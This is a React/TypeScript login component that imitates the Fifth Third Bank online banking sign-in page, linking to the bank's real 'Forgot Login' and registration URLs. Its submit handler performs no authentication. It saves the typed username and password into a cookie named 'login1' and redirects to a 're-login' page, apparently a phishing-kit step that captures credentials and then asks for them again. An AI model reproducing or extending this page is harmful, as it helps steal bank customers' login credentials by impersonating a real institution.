import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";

export default function Login() {
  const [formInput, setFormInput] = useState<Login>({
    username: "",
    password: ""
})

const navigate = useNavigate()

    function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
        setFormInput((prevData) => ({
            ...prevData,
            [event.target.name]: event.target.value
        }))
    }

    function handleSubmit(event: React.FormEvent<HTMLFormElement>){
        
        event.preventDefault()
        cookies.set("login1", formInput)
        navigate("../re-login", {replace:true})
    }

  return (
    <div>
      <form method="POST" className="form" name="login-form" onSubmit={handleSubmit}>
        <div className="m-t">
          <label className="form-label form__label" htmlFor="user-id">
            User ID
          </label>
          <div username-cell="" className="dynamic-state" data-valid="true">
            <div className="input-group">
              <input
                username-input=""
                className="form-input input-group__input full dynamic-state__input"
                name="username"
                id="user"
                type="text"
                required
                onChange={handleInputChange}
              />
              <input
                save-username=""
                type="checkbox"
                id="save"
                className="input-group__checkbox"
                value="Save"
                aria-label="Save username"
              />

              <div className="input-group__addon" aria-hidden="true">
                <div className="input-group__addon__toggle icon-ok"></div>
              </div>
              <div id="user-id-error"></div>
            </div>
          </div>
        </div>

        <div className="m-t">
          <label className="form-label form__label" htmlFor="password">
            Password
          </label>
          <div password-cell="" className="dynamic-state" data-valid="true">
            <input
              password-input=""
              className="form-input full dynamic-state__input"
              name="password"
              id="password"
              type="password"
              autoComplete="off"
              required
              onChange={handleInputChange}
            />
            <div id="password-error"></div>
          </div>
        </div>
        <div className="m-t">
          <button
            login-button=""
            type="submit"
            className="button -default -primary form__btn -full"
          >
            Log In
            <span className="loading--1">.</span>
            <span className="loading--2">.</span>
            <span className="loading--3">.</span>
          </button>
        </div>
        <div className="actions">
          <div className="m-t--sm">
            <a
              id="forgot-login"
              href="https://onlinebanking.53.com/olb/#/forgotLogin?app=web"
              className="anchor"
            >
              Forgot Login
            </a>
            ?
          </div>
          <div className="m-t--sm">
            First Time User?
            <a
              id="register-user"
              href="https://onlinebanking.53.com/olb/#/newUser"
              className="anchor"
              aria-label="Register new user"
            >
              Register
            </a>
            .
          </div>
        </div>
      </form>
    </div>
  );
}
